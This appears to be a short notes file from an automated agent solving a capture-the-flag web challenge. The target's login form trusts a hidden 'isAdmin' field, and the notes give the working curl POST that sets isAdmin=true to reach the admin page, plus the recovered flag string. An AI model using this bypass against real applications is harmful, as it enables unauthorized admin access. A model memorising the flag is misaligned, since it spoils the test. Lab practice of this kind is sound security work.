# Main Agent Brief
## Goal
FLAG{64 hex} on http://web:80 — SOLVED.

## Battlefield
- Target: http://web:80 — Apache 2.4.25 Debian, PHP/5.6.40, index.php login form
- Login handler trusts client-supplied hidden field `isAdmin`

## Curated Knowledge
### Facts
- POST /index.php with username=admin, password=admin, isAdmin=true returns flag page ("Welcome Admin")

## Flags
FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}

## Validated
- Bypass vector: hidden input `isAdmin` (value "false" by default) — send `isAdmin=true`
- Command: curl -s -X POST http://web:80/index.php -d "username=admin&password=admin&isAdmin=true"